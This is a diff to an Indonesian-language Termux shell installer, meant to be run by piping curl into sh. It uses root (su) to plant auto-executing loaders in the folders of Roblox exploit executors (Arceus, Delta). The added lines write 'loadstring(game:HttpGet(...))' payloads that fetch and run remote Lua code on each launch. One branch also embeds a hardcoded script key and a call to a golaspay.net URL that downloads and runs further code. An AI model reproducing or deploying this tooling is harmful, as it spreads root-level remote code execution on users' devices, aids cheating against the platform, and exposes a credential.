@@ -1,6 +1,6 @@
 #!/data/data/com.termux/files/usr/bin/sh
 # ============================================================
-# ZENX PASANG  v1.2  --  tulis loader ke Arceus Autoexec + Delta Autoexecute
+# ZENX PASANG  v1.3  --  tulis loader ke Arceus Autoexec + Delta Autoexecute
 #
 # Dipakai:
 #   curl -sL <REPO>/pasang.sh | sh -s seed
@@ -262,10 +262,31 @@ case "$PRESET" in
             info "Manual:  su -c 'echo ... > \"$AX_LOADER\"'"
         fi
 
-        # tulis ke Delta Autoexecute di tiap client
-        # path: /sdcard/Android/data/com.roblox.clien*/files/gloop/external/autoexecute/
-        printf "\n${B}[+] Tulis loader Delta (Autoexecute tiap client)${N}\n"
+        # tulis ke Delta Autoexecute
+        # Android 10: /sdcard/Android/data/com.roblox.clien*/files/gloop/external/autoexecute/ (per-slot)
+        # Android 15: /sdcard/Delta/Autoexecute/ (satu folder)
+        printf "\n${B}[+] Tulis loader Delta (Autoexecute)${N}\n"
         DL_OK=0
+
+        # --- Android 15: satu folder Delta/Autoexecute ---
+        DL_DIR_A15="/sdcard/Delta/Autoexecute"
+        if su -c "[ -d \"$DL_DIR_A15\" ]" 2>/dev/null; then
+            DL_LOADER="$DL_DIR_A15/zenx.txt"
+            DL_EXTRA="$DL_DIR_A15/zenx_extra.txt"
+            su -c "mkdir -p \"$DL_DIR_A15\"; printf 'loadstring(game:HttpGet(\"%s\"))()' \"$MARKET_URL\" > \"$DL_LOADER\"" 2>/dev/null
+            if [ "$RONIHUB_SC" = "up6kg" ] || [ "$RONIHUB_SC" = "up3.8kg" ]; then
+                su -c "printf 'local script_key=\"P0h1DdohmtTALFrITMSmL2z\"\npcall(loadstring(game:HttpGet(\"https://golaspay.net/scv/UlPNGiNxRw44?key=\"..script_key)))' > \"$DL_EXTRA\"" 2>/dev/null
+            else
+                su -c "rm -f \"$DL_EXTRA\"" 2>/dev/null
+            fi
+            DL_CEK=$(su -c "cat \"$DL_LOADER\" 2>/dev/null" 2>/dev/null)
+            if printf '%s' "$DL_CEK" | grep -q "HttpGet"; then
+                ok "Delta (Android 15): $DL_LOADER ($SC_LABEL)"
+                DL_OK=$((DL_OK + 1))
+            fi
+        fi
+
+        # --- Android 10: per-slot via com.roblox.clien* ---
         for DL_PKG_DIR in /sdcard/Android/data/com.roblox.clien*/files/gloop/external; do
             [ -d "$DL_PKG_DIR" ] || continue
             DL_DIR="$DL_PKG_DIR/autoexecute"
@@ -279,14 +300,15 @@ case "$PRESET" in
             fi
             DL_CEK=$(su -c "cat \"$DL_LOADER\" 2>/dev/null" 2>/dev/null)
             if printf '%s' "$DL_CEK" | grep -q "HttpGet"; then
-                ok "Delta: $DL_LOADER ($SC_LABEL)"
+                ok "Delta (Android 10): $DL_LOADER ($SC_LABEL)"
                 DL_OK=$((DL_OK + 1))
             fi
         done
+
         if [ "$DL_OK" -eq 0 ]; then
-            warn "Delta Autoexecute: gak ada folder client ketemu (gak masalah kalau Delta belum keinstall)."
+            warn "Delta Autoexecute: gak ada folder ketemu (gak masalah kalau Delta belum keinstall)."
         else
-            ok "Delta loader ketulis ke $DL_OK client"
+            ok "Delta loader ketulis ke $DL_OK lokasi"
         fi
         ;;
 esac
